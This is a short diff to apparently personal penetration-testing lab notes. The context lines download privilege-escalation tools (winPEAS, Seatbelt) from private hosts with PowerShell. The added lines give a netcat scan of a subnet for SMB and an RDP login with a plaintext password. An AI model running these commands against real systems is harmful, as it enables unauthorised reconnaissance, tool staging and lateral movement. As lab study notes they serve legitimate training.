@@ -58,3 +58,7 @@ iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
 iwr -uri http://192.168.45.204:9090/Seatbelt.exe -Outfile seat.exe
 ```
 
+network scanning
+for i in $(seq 1 254); do nc -zv -w 1 172.16.203.$i 445; done
+
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
